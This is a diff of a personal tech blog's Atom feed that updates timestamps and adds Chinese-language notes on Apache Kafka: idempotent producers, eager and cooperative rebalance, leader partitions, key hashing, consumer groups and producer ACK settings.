@@ -3,14 +3,14 @@
     <title>Jason&#39;s tech blog</title>
     <link href="https://hung-jia-jun.github.io/feed.xml" rel="self" >
     <link href="https://hung-jia-jun.github.io" >
-    <updated>2025-12-17T15:43:28Z</updated>
+    <updated>2025-12-17T16:24:27Z</updated>
     <id>https://hung-jia-jun.github.io</id>
         <entry>
             <title>
                 技術筆記
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/</id>
             <content type="html">
                 &lt;p&gt;just 技術筆記&lt;/p&gt;
@@ -23,7 +23,7 @@
                 密碼學 - 零知識證明 - 密鑰協商
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/密碼學 - 零知識證明 - 密鑰協商/</id>
             <content type="html">
                 &lt;img src=&quot;https://www.plantuml.com/plantuml/svg/SoWkIImgAStDuNA0inAJI_AB51npCfDJeMod_2GkBbjRXQUjQrvEwtxQt_niwWu5Mriki1e5NJkG0WKhgBH2WOv2keB6qoNBNsnU1LJuegFz-PJvppecF6rjrWGRytBsp6VJTZwViWWe_dnvuyk96u1ge6Otx44n6CAmKdZPkEFPvFQNirOyMmdLef28RltpcNjUDZGgE2hOAcYaQsabQYgeAXHmWUJWIh0OamHJ0RCAQemJr9WaY348TxzOqV5ytVIdhHkVx5hzT7qRo0niBlO6wNV2xWomd2F2xBpyabI5eipqZ18hME00RMZVzNnM2r3jipdDpsVlU3gXXyiXDIy575SG6W00&quot; alt=&quot;uml diagram&quot; /&gt;
@@ -96,7 +96,7 @@ p 夠大時，Eve 幾乎不可能算出 Alice 的私鑰&lt;br /&gt;
                 安裝 Obsidian 語意搜尋套件
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/安裝 Obsidian 語意搜尋套件/</id>
             <content type="html">
                 &lt;p&gt;Plugin repo: &lt;a href=&quot;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;https://github.com/bbawj/obsidian-semantic-search?tab=readme-ov-file#demo&lt;/a&gt;&lt;/p&gt;
@@ -157,7 +157,7 @@ nomic-embed-text:latest    0a109f422b47    274 MB    About an hour ago
                 使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/使用 pmap、smaps 與 gdb Dump 出 Nginx Worker 記憶體區段教學/</id>
             <content type="html">
                 &lt;h1 id=&quot;主旨&quot; tabindex=&quot;-1&quot;&gt;主旨&lt;/h1&gt;
@@ -239,7 +239,7 @@ end:   0x7fe364000000
                 GCP dataproc 運行 python scripts
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/pySpark/GCP dataproc 運行 python scripts/</id>
             <content type="html">
                 &lt;p&gt;建立 dataproc cluster&lt;/p&gt;
@@ -315,7 +315,7 @@ gsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
                 kafka 高效率傳輸設定
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka 高效率傳輸設定/</id>
             <content type="html">
                 &lt;p&gt;訂閱 kafka 消息&lt;/p&gt;
@@ -358,7 +358,7 @@ gsutil cp pip_init.sh gs://dataproc-staging-us-central1-473678078038-tw1bdolx/
                 kafka  topic 實驗
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/kafka  topic 實驗/</id>
             <content type="html">
                 &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#kafka&quot;&gt;#kafka&lt;/a&gt;&lt;/p&gt;
@@ -447,10 +447,333 @@ quickstart-events
         </entry>
         <entry>
             <title>
+                Kafka 冪等 Producer
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/</id>
+            <content type="html">
+                &lt;h1 id=&quot;冪等定義&quot; tabindex=&quot;-1&quot;&gt;冪等定義&lt;/h1&gt;
+&lt;p&gt;冪等 = 同一個操作，執行一次或執行多次，結果都一樣。&lt;br /&gt;
+不論你做 1 次、10 次、100 次，&lt;br /&gt;
+系統的最終狀態必須一模一樣。&lt;/p&gt;
+&lt;p&gt;kafka 重複 message 問題&lt;br /&gt;
+若 ack 消息回傳期間網路中斷&lt;br /&gt;
+Producer 就不會收到 ACK 通知，就會觸發 Retry 機制&lt;br /&gt;
+造成訊息重複發送的情況&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251208002229.png&quot; alt=&quot;Pasted image 20251208002229.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka 冪等 Producer/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka rebalance 機制 - Eager Rebalance
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/</id>
+            <content type="html">
+                &lt;h1 id=&quot;eager-rebalance-rebalance&quot; tabindex=&quot;-1&quot;&gt;Eager Rebalance(此 rebalance 會造成世界停止)&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;停止 consumer 訂閱&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194626.png&quot; alt=&quot;Pasted image 20251129194626.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;分配完重新開始訂閱&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194713.png&quot; alt=&quot;Pasted image 20251129194713.png&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;consumer 在 rebalance 後，不一定能再次訂閱到之前的 Partition&lt;/li&gt;
+&lt;li&gt;在世界停止期間，所有 consumer 訂閱會停止&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制詳解&lt;/h2&gt;
+&lt;hr /&gt;
+&lt;p&gt;初始狀態&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129152948.png&quot; alt=&quot;Pasted image 20251129152948.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;新的 consumer 加入&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153059.png&quot; alt=&quot;Pasted image 20251129153059.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;通知 kafka cluster 的 Coordinator broker 進行 Rebalancing&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129153922.png&quot; alt=&quot;Pasted image 20251129153922.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Coordinator broker 通知 consumer 斷開已連線的 partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191802.png&quot; alt=&quot;Pasted image 20251129191802.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;開始 Rebalancing&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129191900.png&quot; alt=&quot;Pasted image 20251129191900.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Coordinator broker 隨機選出一個 consumer 做為 Leader Consumer&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192518.png&quot; alt=&quot;Pasted image 20251129192518.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Leader Consumer 從 Coordinator broker 取得 consumer group info&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129192715.png&quot; alt=&quot;Pasted image 20251129192715.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Leader Consumer&lt;/strong&gt; 的責任是：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;收集所有消費者的訂閱資訊 (subscription)。&lt;/li&gt;
+&lt;li&gt;根據分配策略 (Range, RoundRobin, Sticky 等) 計算 &lt;strong&gt;partition → consumer 的映射&lt;/strong&gt;。&lt;/li&gt;
+&lt;li&gt;將分配結果提交給 Coordinator。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Coordinator&lt;/strong&gt; 再把這個分配結果下發給所有消費者，完成 rebalance。&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193028.png&quot; alt=&quot;Pasted image 20251129193028.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;完成 rebalance&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129193100.png&quot; alt=&quot;Pasted image 20251129193100.png&quot; /&gt;&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Eager Rebalance/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/</id>
+            <content type="html">
+                &lt;h1 id=&quot;背景故事&quot; tabindex=&quot;-1&quot;&gt;背景故事&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;kafka 在新版本引入Cooperative Rebalance(增量 Rebalance)機制&lt;br /&gt;
+在過去版本中，只要 consumer 斷線，就會觸發 rebalance，會停止所有 consumer 的訂閱流&lt;br /&gt;
+Cooperative Rebalance 就是為了解決這個問題&lt;br /&gt;
+以下是具體流程&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129194411.png&quot; alt=&quot;Pasted image 20251129194411.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;停止 consumer 1 對 Partition 2 的訂閱&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200033.png&quot; alt=&quot;Pasted image 20251129200033.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;過一段時間， kafka 會重新 Assign Partition 2 給 Consumer 2(new consumer)&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129200130.png&quot; alt=&quot;Pasted image 20251129200130.png&quot; /&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!IMPORTANT]  Cooperative Rebalance 好處&lt;br /&gt;
+其他 Consumer 還是可以持續訂閱，不會中斷&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;how-to-use&quot; tabindex=&quot;-1&quot;&gt;How to use?&lt;/h2&gt;
+&lt;p&gt;kafka consumer 可以設定 partition.assignment.strategy&lt;/p&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka rebalance 機制 - Cooperative Rebalance(增量 Rebalance)/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka leader partition 機制研究
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/</id>
+            <content type="html">
+                &lt;h1 id=&quot;leader-partition&quot; tabindex=&quot;-1&quot;&gt;leader partition 概念&lt;/h1&gt;
+&lt;p&gt;每個 Topic 可以有多個 Partition&lt;br /&gt;
+每個 Partition 都是一個 Partition 副本組&lt;br /&gt;
+每個 Partition 副本組可以有多個 replication&lt;br /&gt;
+每個 Partition 副本組會決定誰是 leader partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175715.png&quot; alt=&quot;Pasted image 20251207175715.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;topic = 多個 partition 副本組的集合&lt;br /&gt;
+每個 Partition 都會有一個 Leader 與零個或多個 followers(副本)&lt;br /&gt;
+kafka 分片分配規則&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;在同個 topic 中，每個 partition 副本組的 leader 分片會儘量分散到每個 Broker&lt;/li&gt;
+&lt;li&gt;一台 broker 可以同時擔任多個 partitions 副本組的 leader&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207175340.png&quot; alt=&quot;Pasted image 20251207175340.png&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka leader partition 機制研究/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka key hashing
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/</id>
+            <content type="html">
+                &lt;p&gt;Producer 預設的 Partition  邏輯使用 murmur2 進行邏輯分區，需要輸入 key，再根據 key 去切分此筆 message 該去哪個 partition，這帶來一個好處，只要是相同的 key，那他的分區位置就是可預測的，並且 kafka 保證分區內的 message 是有序性的，這點用於序列化資料是很重要的。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!CAUTION]&lt;br /&gt;
+若使用 kafka key 有序性分區，當新增 partition 時，會打破原本的分區規則&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;若因業務需求無法擴張 partition 數量，例如交易資料需要有序性，可以增加 broker 數量&lt;br /&gt;
+此論點依據為&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Leader partition 會重新分散到更多 broker&lt;br /&gt;
+假設：&lt;br /&gt;
+- 3 partitions&lt;br /&gt;
+- 3 brokers
+&lt;ul&gt;
+&lt;li&gt;每個 broker 當 1 個 leader&lt;br /&gt;
+現在變成：
+&lt;ul&gt;
+&lt;li&gt;3 partitions&lt;/li&gt;
+&lt;li&gt;6 brokers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Leader 還是 3 個沒錯，但 follower replicas 會被分散&lt;/li&gt;
+&lt;/ul&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka key hashing/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka consumer group 與 rebalance 機制
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/</id>
+            <content type="html">
+                &lt;p&gt;Topic 可以切分多個 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134453.png&quot; alt=&quot;Pasted image 20251129134453.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;一個 consumer 可以訂閱多個 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134625.png&quot; alt=&quot;Pasted image 20251129134625.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;每個 consumer 都可以訂閱 Topic 內所有的 partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135104.png&quot; alt=&quot;Pasted image 20251129135104.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;多個 Consumer 可以組成一個 Consumer group&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129134529.png&quot; alt=&quot;Pasted image 20251129134529.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;同個 Consumer group 內共享 Topic 內所有的 Partition&lt;br /&gt;
+一個 consumer 就會訂閱所有的 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135735.png&quot; alt=&quot;Pasted image 20251129135735.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;兩個 consumer 分散訂閱 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129135906.png&quot; alt=&quot;Pasted image 20251129135906.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;三個 consumer 就會一個 consumer 訂閱一個 partition，均分所有的 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140037.png&quot; alt=&quot;Pasted image 20251129140037.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;若 consumer 數量 &amp;gt; Partition 數量，多餘的 Consumer 就會 Disable&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140258.png&quot; alt=&quot;Pasted image 20251129140258.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;ui&quot; tabindex=&quot;-1&quot;&gt;以 UI 介面為例&lt;/h2&gt;
+&lt;p&gt;Consumer group: &lt;code&gt;my-java-application&lt;/code&gt;&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140444.png&quot; alt=&quot;Pasted image 20251129140444.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;訂閱了一個 Topic，並且擁有兩個 Member&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140641.png&quot; alt=&quot;Pasted image 20251129140641.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;並且從 Assigned partitions 可以得知，總共有三個 Partition&lt;br /&gt;
+client id 為 &lt;code&gt;b52ac033-cf4b-49d2-8a13-78ea6b4e1cf1&lt;/code&gt; 的 consumer 分到 1 個 partition&lt;br /&gt;
+client id 為 &lt;code&gt;5545bc61-e3fd-4f2f-a0d7-fc7d77d1ddcc&lt;/code&gt; 的 consumer 分到 2 個 partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129140811.png&quot; alt=&quot;Pasted image 20251129140811.png&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;查詢 consumer group 裡面的 member 目前訂閱哪個 Topic，與每個 member 訂閱的 Partition 有哪些&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups --bootstrap-server localhost:19092 --group my-java-application --describe
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141307.png&quot; alt=&quot;Pasted image 20251129141307.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;案例實作&quot; tabindex=&quot;-1&quot;&gt;案例實作&lt;/h2&gt;
+&lt;p&gt;Topic: demo_java&lt;br /&gt;
+Partition: 3&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ kafka-topics.sh --bootstrap-server localhost:19092 --topic demo_java --describe                           
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141715.png&quot; alt=&quot;Pasted image 20251129141715.png&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;case-1&quot; tabindex=&quot;-1&quot;&gt;Case 1: 只有一個訂閱者&lt;/h3&gt;
+&lt;p&gt;CONSUMER-ID: consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 (訂閱三個 partition)&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141509.png&quot; alt=&quot;Pasted image 20251129141509.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;case-2&quot; tabindex=&quot;-1&quot;&gt;Case 2: 兩個訂閱者&lt;/h2&gt;
+&lt;p&gt;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75 訂閱 id: 0,1 partition&lt;br /&gt;
+consumer-my-java-application-1-c478a360-25f4-4cd8-8a13-158f0b960d71 訂閱 id: 2 partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129141835.png&quot; alt=&quot;Pasted image 20251129141835.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;case-3-partition-consumer&quot; tabindex=&quot;-1&quot;&gt;Case 3: 三個訂閱者(一個 Partition 對應一個 consumer)&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142121.png&quot; alt=&quot;Pasted image 20251129142121.png&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;case-4-and-gt-partition&quot; tabindex=&quot;-1&quot;&gt;Case 4: 四個訂閱者(訂閱者數量 &amp;gt; Partition 數量)&lt;/h2&gt;
+&lt;p&gt;Consumer 0 未被分配到任一個 Partition&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129142635.png&quot; alt=&quot;Pasted image 20251129142635.png&quot; /&gt;&lt;/p&gt;
+&lt;h1 id=&quot;rebalance&quot; tabindex=&quot;-1&quot;&gt;Rebalance 機制&lt;/h1&gt;
+&lt;p&gt;每次 Rebalance 都需要 Broker 參與，但不是每台 Broker 都需要參與 Rebalance 的行為，只有 Coordinator Broker 才需要&lt;br /&gt;
+透過以下指令查詢 Coordinator Broker&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ kafka-consumer-groups.sh --bootstrap-server localhost:19092 --group my-java-application --describe --state 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251129144503.png&quot; alt=&quot;Pasted image 20251129144503.png&quot; /&gt;&lt;br /&gt;
+以這次案例來說，group: my-java-application 的 Coordinator Broker 是 localhost:19092&lt;/p&gt;
+&lt;p&gt;觀察每次新建 consumer 都會產出的 Log&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Request joining group due to: group is already rebalancing
+Revoke previously assigned partitions demo_java-1
+
+(Re-)joining group
+
+Successfully joined group with generation Generation{generationId=34, memberId=&#39;consumer-my-java-application-1-a2c4de74-999b-4898-a0e3-b2f165a37a75&#39;, protocol=&#39;range&#39;}
+
+Notifying assignor about the new Assignment(partitions=[demo_java-2])
+Adding newly assigned partitions: demo_java-2
+Setting offset for partition demo_java-2 to the committed offset FetchPosition{offset=959, offsetEpoch=Optional[1], currentLeader=LeaderAndEpoch{leader=Optional[localhost:19092 (id: 0 rack: null)], epoch=absent}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Log&lt;/th&gt;
+&lt;th&gt;解釋&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Request joining group due to: group is already rebalancing&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Group 在 rebalance，consumer 需要重新加入 group。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Revoke previously assigned partitions demo_java-1&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;Coordinator 通知 consumer 放棄目前持有的 partition，準備進入下一輪分配。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;(Re-)joining group&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;consumer 正在重新加入 group，等待 coordinator 分配。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Successfully joined group with generation...&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;consumer 正式加入 group，獲得 generationId 與 memberId。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Notifying assignor about the new Assignment(...)&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;consumer client 收到 coordinator 的分配結果，更新要訂閱的 partition&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Adding newly assigned partitions: demo_java-2&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;新一輪 rebalance 分配到了 demo_java-2。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;strong&gt;Setting offset for partition demo_java-2 to the committed offset...&lt;/strong&gt;&lt;/td&gt;
+&lt;td&gt;consumer 讀取起點設定為 partition 目前已 commit 的 offset（本例為 959）。&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;blockquote&gt;
+&lt;p&gt;[!TIP]&lt;br /&gt;
+Generation 用於追蹤目前 Group 的狀態，避免舊的成員提交 offset，只有新成員能提交 Partition offset&lt;/p&gt;
+&lt;/blockquote&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka consumer group 與 rebalance 機制/" >
+        </entry>
+        <entry>
+            <title>
+                Kafka Topic Availability
+                
+            </title>
+            <updated>2025-12-17T16:24:19Z</updated>
+            <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/</id>
+            <content type="html">
+                &lt;h1 id=&quot;producer-ack&quot; tabindex=&quot;-1&quot;&gt;Producer ACK 機制說明&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;ACK = 0
+&lt;ul&gt;
+&lt;li&gt;Case: 發送速度最快，但資料丟失風險最大&lt;/li&gt;
+&lt;li&gt;只要發送成功就繼續發送下一筆&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;ACK = 1
+&lt;ul&gt;
+&lt;li&gt;Case: 剛剛好的發送速度，適合日常一般資料使用，有部分資料丟失風險&lt;/li&gt;
+&lt;li&gt;Leader Partition 回傳 ACK 就算成功&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;ACK = all (搭配)
+&lt;ul&gt;
+&lt;li&gt;Case: 希望資料不要丟失，可以考慮這個設置&lt;/li&gt;
+&lt;li&gt;需要 Partition 副本組內指定 min.insync.replicas 數量的 replica ACK，訊息才會 ACK
+&lt;ul&gt;
+&lt;li&gt;min.insync.replicas = 1 -&amp;gt; Leader ACK 就成功&lt;/li&gt;
+&lt;li&gt;min.insync.replicas = 2 -&amp;gt; Leader + replica 兩個 ACK 就成功&lt;br /&gt;
+&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020251207231419.png&quot; alt=&quot;Pasted image 20251207231419.png&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+
+            </content>
+            <link href="https://hung-jia-jun.github.io/技術文件/apache_kafka/Kafka Topic Availability/" >
+        </entry>
+        <entry>
+            <title>
                 Consumer offset reset 行為
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/apache_kafka/Consumer offset reset 行為/</id>
             <content type="html">
                 &lt;h1 id=&quot;情境&quot; tabindex=&quot;-1&quot;&gt;情境&lt;/h1&gt;
@@ -554,7 +877,7 @@ try(openSearchClient; consumer){
                 HA proxy VRRP 研究
                 
             </title>
-            <updated>2025-12-17T15:43:17Z</updated>
+            <updated>2025-12-17T16:24:19Z</updated>
             <id>https://hung-jia-jun.github.io/技術文件/Proxy/HA proxy VRRP 研究/</id>
             <content type="html">
                 &lt;p&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#haproxy&quot;&gt;#haproxy&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#vrrp&quot;&gt;#vrrp&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#linux&quot;&gt;#linux&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#keepalived&quot;&gt;#keepalived&lt;/a&gt; &lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#proxy&quot;&gt;#proxy&lt;/a&gt;&lt;/p&gt;
